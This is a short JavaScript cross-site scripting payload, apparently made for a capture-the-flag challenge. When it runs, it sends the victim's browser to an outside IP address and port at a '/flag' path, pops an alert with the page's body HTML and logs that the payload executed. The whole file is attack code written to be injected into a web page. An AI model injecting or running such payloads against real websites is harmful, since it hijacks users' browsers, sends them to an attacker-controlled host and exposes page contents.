function xssPayload() {
  document.location="http://165.232.190.5:1900/flag";
  alert(document.body.innerHTML);
}

console.log('XSS payload executed');
xssPayload();
